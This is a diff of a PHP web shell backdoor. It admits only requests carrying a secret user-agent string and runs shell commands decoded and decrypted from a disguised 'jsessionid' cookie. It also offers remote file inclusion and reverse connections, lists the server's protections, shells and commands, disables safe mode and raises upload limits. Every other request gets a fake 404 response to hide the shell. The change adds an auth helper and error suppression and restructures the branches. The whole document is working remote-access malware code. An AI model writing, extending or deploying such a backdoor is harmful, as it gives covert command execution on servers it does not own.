@@ -1,5 +1,7 @@
 <?php
-//leave me here!
+//68157130d095065a8559252f5427ffd493c09d750b6d0230931e2c1375609ced24c7439f4a8282795466dc1ff60638387c1062805ae3d18ef5dc4d53822118fb2cc49e71a4ef27fb3a9d56
+
+error_reporting(E_ERROR | E_PARSE);
 if ( ! defined( "PATH_SEPARATOR" ) ) {
     if (str_contains($_ENV["OS"], "Win") !== false)
         define( "PATH_SEPARATOR", ";" );
@@ -38,7 +40,7 @@ set_include_path(get_include_path().PATH_SEPARATOR.scache);
 @ini_set("safe_mode", 0);
 @ini_set("file_uploads", "on");
 @ini_set("max_file_uploads",20);
-@ini_set("upload_max_filesize", "1G");
+@ini_set("upload_max_filesize", "24G");
 @ini_set("upload_tmp_dir", getcwd());
 
 function banner()
@@ -211,6 +213,18 @@ function remoteFileInclude(string $targetFile)
     }
 }
 
+function validate_auth(string | null $agent): bool
+{
+    if (is_null($agent)){
+        return false;
+    }
+    if (str_contains($agent, "sp1.1") !== false){
+        return true;
+    }else{
+        return false;
+    }
+}
+
 function normalize_for_windows($com): string
 {
     $com = base64_decode($com);
@@ -258,125 +272,132 @@ $ad = null;
 $ct = null;
 $split = null;
 
-if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1.1') {
-    banner();
-    if (isset($_POST["cr"])) {
-        if ($_POST['cr'] === "1") {
-            $split = base64_decode(unserialize(base64_decode($_COOKIE['jsessionid']), ["allowed_classes" => false]));
-            executeCommands($split);
-        } elseif ($_POST['cr'] === '1b') {
-            $split = base64_decode($_COOKIE['jsessionid']);
-            executeCommands($split, '1');
-        } else {
-            $s = $_COOKIE['jsessionid'];
-            $v = explode(".", base64_decode($s));
-            $split = sodium_crypto_aead_chacha20poly1305_decrypt(base64_decode($v[3]), base64_decode($v[2]), base64_decode($v[0]), base64_decode($v[1]));
-            executeCommands(base64_decode($split));
-        }
-    }elseif (isset($_POST["doInclude"])) {
-        remoteFileInclude($_POST["doInclude"]);
-    } elseif (isset($_COOKIE["cb64"])) {
-        $aSX = explode(".", $_COOKIE['cb64']);
-        if (hash("sha512", $_COOKIE['jsessionid'], $binary = false) === $aSX[1]) {
-            $sp = explode('.', base64_decode($_COOKIE['jsessionid']));
-            try {
-                $final = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt($sp[3], $sp[0], $sp[1], $sp[2]);
-            } catch (SodiumException $e) {
-                throw new Exception("I require Sodium!");
-            }
-            $axD = unserialize(base64_decode($final), ['allowed_classes' => false]);
-            b64($axD, $aSX[0]);
-        }else{
-            http_response_code(444);
-        }
-    } elseif ($_SERVER['REQUEST_METHOD'] === "POST" && $_COOKIE['jsessionid']) {
-        $splitter = explode(".", base64_decode($_COOKIE['jsessionid']));
-        if (function_exists(pcntl_fork()) === true) {
-            $pid = pcntl_fork();
-            if ($pid === -1) {
-                die("\n\n");
+if (validate_auth($_SERVER['HTTP_USER_AGENT'])) {
+    if ($_SERVER["REQUEST_METHOD"] == "POST") {
+        banner();
+        if (isset($_POST["cr"])) {
+            if ($_POST['cr'] === "1") {
+                $split = base64_decode(unserialize(base64_decode($_COOKIE['jsessionid']), ["allowed_classes" => false]));
+                executeCommands($split);
+            } elseif ($_POST['cr'] === '1b') {
+                $split = base64_decode($_COOKIE['jsessionid']);
+                executeCommands($split, '1');
             } else {
-                pcntl_wait($status);
-                reverseConnections($splitter[0], $splitter[3], $splitter[1], $splitter[2]);
+                $s = $_COOKIE['jsessionid'];
+                $v = explode(".", base64_decode($s));
+                $split = sodium_crypto_aead_chacha20poly1305_decrypt(base64_decode($v[3]), base64_decode($v[2]), base64_decode($v[0]), base64_decode($v[1]));
+                executeCommands(base64_decode($split));
+            }
+        } elseif (isset($_POST["doInclude"])) {
+            remoteFileInclude($_POST["doInclude"]);
+        } elseif (isset($_COOKIE["cb64"])) {
+            $aSX = explode(".", $_COOKIE['cb64']);
+            if (hash("sha512", $_COOKIE['jsessionid'], $binary = false) === $aSX[1]) {
+                $sp = explode('.', base64_decode($_COOKIE['jsessionid']));
+                try {
+                    $final = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt($sp[3], $sp[0], $sp[1], $sp[2]);
+                } catch (SodiumException $e) {
+                    throw new Exception("I require Sodium!");
+                }
+                $axD = unserialize(base64_decode($final), ['allowed_classes' => false]);
+                b64($axD, $aSX[0]);
+            } else {
+                http_response_code(444);
+            }
+        } elseif ($_SERVER['REQUEST_METHOD'] === "POST" && $_COOKIE['jsessionid']) {
+            $splitter = explode(".", base64_decode($_COOKIE['jsessionid']));
+            if (function_exists(pcntl_fork()) === true) {
+                $pid = pcntl_fork();
+                if ($pid === -1) {
+                    die("\n\n");
+                } else {
+                    pcntl_wait($status);
+                    reverseConnections($splitter[0], $splitter[3], $splitter[1], $splitter[2]);
+                    die();
+                }
+            } else {
+                echo "Cannot fork, as it does not exist on this system..... using passthru\n";
+                $re = null;
+                passthru(reverseConnections($splitter[0], $splitter[3], $splitter[1], $splitter[2]), $re);
                 die();
             }
-        } else {
-            echo "Cannot fork, as it does not exist on this system..... using passthru\n";
-            $re = null;
-            passthru(reverseConnections($splitter[0], $splitter[3], $splitter[1], $splitter[2]), $re);
-            die();
         }
-    }
-} elseif ($_SERVER['REQUEST_METHOD'] == "GET" && $_SERVER['HTTP_USER_AGENT'] === 'sp1.1') {
-    banner();
-    if (!empty($_GET["qs"])) {
-        switch ($_GET["qs"]) {
-            case "cqP":
-                foreach (checkPack() as $packs => $isenabled){
-                    $isenabled = trim($isenabled);
-                    if ($isenabled === "Disabled"){
-                        $r = "\033[0;31m{$isenabled}\033[0m";
-                    }else {
-                        $r = "\033[0;36m{$isenabled}\033[0m";
+    } elseif ($_SERVER['REQUEST_METHOD'] == "GET" && $_SERVER['HTTP_USER_AGENT'] === 'sp1.1') {
+        banner();
+        if (!empty($_GET["qs"])) {
+            switch ($_GET["qs"]) {
+                case "cqP":
+                    foreach (checkPack() as $packs => $isenabled) {
+                        $isenabled = trim($isenabled);
+                        if ($isenabled === "Disabled") {
+                            $r = "\033[0;31m{$isenabled}\033[0m";
+                        } else {
+                            $r = "\033[0;36m{$isenabled}\033[0m";
+                        }
+                        echo sprintf("\033[0;35m[ %s ]\033[0m => %s\n", $packs, trim($r));
                     }
-                    echo sprintf("\033[0;35m[%s]\033[0m => %s\n", $packs, trim($r));
-                    http_response_code(404);
-                }
-                break;
-            case "cqPR":
-                foreach (parseProtections() as $prots => $isenabled){
-                    $isenabled = trim($isenabled);
-                    if ($isenabled === "Disabled"){
-                        $r = "\033[0;31m{$isenabled}\033[0m";
-                    }else {
-                        $r = "\033[0;36m{$isenabled}\033[0m";
+                    header("X-Success: 1");
+                    break;
+                case "cqPR":
+                    foreach (parseProtections() as $prots => $isenabled) {
+                        $isenabled = trim($isenabled);
+                        if ($isenabled === "Disabled") {
+                            $r = "\033[0;31m{$isenabled}\033[0m";
+                        } else {
+                            $r = "\033[0;36m{$isenabled}\033[0m";
+                        }
+                        echo sprintf("\033[0;35m[ %s ]\033[0m => %s\n", $prots, trim($r));
                     }
-                    echo sprintf("\033[0;35m[%s]\033[0m => %s\n", $prots, trim($r));
-                    http_response_code(404);
-                }
-                break;
-            case "cqSH":
-                foreach (checkShells(slopos) as $shells => $isenabled){
-                    $isenabled = trim($isenabled);
-                    if ($isenabled === "Disabled"){
-                        $r = "\033[0;31m{$isenabled}\033[0m";
-                    }else {
-                        $r = "\033[0;36m{$isenabled}\033[0m";
+                    header("X-Success: 1");
+                    break;
+                case "cqSH":
+                    foreach (checkShells(slopos) as $shells => $isenabled) {
+                        $isenabled = trim($isenabled);
+                        if ($isenabled === "Disabled") {
+                            $r = "\033[0;31m{$isenabled}\033[0m";
+                        } else {
+                            $r = "\033[0;36m{$isenabled}\033[0m";
+                        }
+                        echo sprintf("\033[0;35m[ %s ]\033[0m => %s\n", $shells, trim($r));
                     }
-                    echo sprintf("\033[0;35m[%s]\033[0m => %s\n", $shells, trim($r));
-                    http_response_code(404);
-                }
-                break;
-            case "cqCM":
-                foreach (checkComs() as $commands => $isenabled){
-                    $isenabled = trim($isenabled);
-                    if ($isenabled === "Disabled"){
-                        $r = "\033[0;31m{$isenabled}\033[0m";
-                    }else {
-                        $r = "\033[0;36m{$isenabled}\033[0m";
+                    header("X-Success: 1");
+                    break;
+                case "cqCM":
+                    foreach (checkComs() as $commands => $isenabled) {
+                        $isenabled = trim($isenabled);
+                        if ($isenabled === "Disabled") {
+                            $r = "\033[0;31m{$isenabled}\033[0m";
+                        } else {
+                            $r = "\033[0;36m{$isenabled}\033[0m";
+                        }
+                        echo sprintf("\033[0;35m[ %s ]\033[0m => %s\n", $commands, trim($r));
                     }
-                    echo sprintf("\033[0;35m[%s]\033[0m => %s\n", $commands, trim($r));
-                    http_response_code(404);
-                }
-                break;
-            case "cqI":
-                $fsize = ini_get("max_file_uploads") ? ini_get("max_file_uploads"):"cannot set max_file_uploads";
-                $sfem = ini_get("safe_mode") ? "set to true":"cannot set safemode.";
-                $fups = ini_get("file_uploads") ? "true":"false";
-                $ftd = ini_get("upload_tmp_dir") ? ini_get("upload_tmp_dir"):"cannot set upload_tmp_dir";
-                echo <<<INI
+                    header("X-Success: 1");
+                    break;
+                case "cqI":
+                    $fsize = ini_get("max_file_uploads") ? ini_get("max_file_uploads") : "cannot set max_file_uploads";
+                    $sfem = ini_get("safe_mode") ? "set to true" : "cannot set safemode.";
+                    $fups = ini_get("file_uploads") ? "true" : "false";
+                    $ftd = ini_get("upload_tmp_dir") ? ini_get("upload_tmp_dir") : "cannot set upload_tmp_dir";
+                    echo <<<INI
 Max filesize: $fsize
 Safemode: $sfem
 File_Uploads: $fups
 Upload Temp Dir: $ftd
-INI.PHP_EOL;
-                break;
+INI. PHP_EOL;
+                    header("X-Success: 1");
+                    break;
+            }
+            http_response_code(404);
+            die();
+        } else {
+            http_response_code(404);
+            die();
         }
     } else {
         http_response_code(404);
         die();
     }
-} else {
-    http_response_code(404);
-    die();
 }
+http_response_code(404);
+die();
